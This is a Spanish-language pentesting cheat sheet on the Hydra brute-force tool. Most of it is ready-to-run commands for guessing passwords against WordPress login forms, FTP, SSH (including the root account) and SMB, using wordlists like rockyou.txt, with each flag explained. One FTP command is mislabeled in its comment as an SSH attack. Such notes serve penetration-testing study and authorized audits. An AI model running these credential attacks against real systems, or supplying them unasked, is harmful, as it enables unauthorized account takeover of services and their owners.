# Hydra 

Tags: #Hydra 

Es una herramienta de prueba de penetracion que se utiliza para realizar ataques de fuerza bruta, por asi decirlo, en servicios de autenticacion remotos. Esta herramientas nos ayuda a poder encontrar passwd mediante ataques futivos. 

- Soporte de multiples protocolos: Hydra es compatible con una amplia gama de protocolos de autenticacion incluyendo: SSH, Telnte, FTP, HTTP, POP3, SMB, etc...
* Fuerza bruta avanzada: Hydra es capas de realizar ataques de fuerza bruta avanzados, incluyendo ataques de diccionario y ataques basados en patrones. 
	* Podemos usar los diccionarios que ya viene en Parrot o Kali Linux (rockyou.txt)
* Modos de operacion flexibles: Hydra admite diferentes modos de operacion, incluyendo modo de ataque directo, modo de ataque de diccionario y modo de ataque hibrido.
* Capacidad de parelelizacion: Hydra es capas de realizar multiples intentos de autenticacion simultaneamente, lo que mejora la velocidad y la eficiencia del ataque. 

- Casos de uso:
	- Pruebas de pentracion 
	- Audiroria de passwd
	- Recuperacion de passwd

## Hydra fuerza bruta WordPress

Esto se usa en el panel del admin de WordPress.
```python
❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt http://IP http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302' 
❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt http://IP http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid user'
# Haremos un ataque de fuerza bruta a WordPress

	# l (ele) = Usuario que en este caso es  'omar'
	# P = Ruta del diccionario
	# log y pwd = Lo podemos encontrar en el apartado de la pagina web 'Ctrl + u' 
	# S = Redireccionamiento con el codigo 302
	# F = Error que nos muestre el panel de autenticacion, por si no sirve con el 'S'
```


## Hydra fuerza bruta FTP
```python
❯ hydra -l omar -P /usr/share/wordlists/rockyou.txt ftp://❮IP❯ -t 15 # Haremos un ataque de fuerza bruta al puerto SSH, antes de completar el comando con soble TAB podemos ver la lista de diccionarios

	# l (ele) = Usuario que en este caso es  'omar'
	# L = Indicas un archivo que disponga de usuarios 
	# P = Ruta del diccionario o 'archivo que contiene passwds'
	# t = Lanzar tareas en paralelo al mismo tiempo
```

## Hydra fuerza bruta SSH

```python
❯ hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ssh://❮IP❯ 
# Haremos un ataque de fuerza bruta al puerto SSH

	# ssh = Puerto al que vamos a atacar 22
	# IP = Direccion de la maquina victima
	# P = Ruta del diccionario o 'archivo que contiene passwds'
	# L = Ruta del diccionario o 'archivo que contiene users'
```

```python
❯ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://❮IP❯ -t 15 -V -s 2222 # Haremos un ataque de fuerza bruta al puerto SSH, antes de completar el comando con soble TAB podemos ver la lista de diccionarios

	# ssh = Puerto al que vamos a atacar 22
	# IP = Direccion de la maquina victima
	# P = Ruta del diccionario o 'archivo que contiene passwds'
	# l (ele) = usuario que en este caso es  'root'
	# t = Lanzar tareas en paralelo al mismo tiempo
	# V = Verbosity
	# s = Port y es el puerto al que nos queremos conectar 
```

## Hydra fuerza bruta SMB
```python 
❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://<IP>        # Fuerza bruta al usuario en el servidor SMB
❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> smb

❯ hydra -L user.list -P password.list smb://<IP>        # Para ver si esos usuarios y passwd son validos en un servidor SMB

	# L = Ruta o archivo que contiene los usuarios
	# P = Ruta o archivo que contiene las passwd
	# l = Un usuario en especifico
```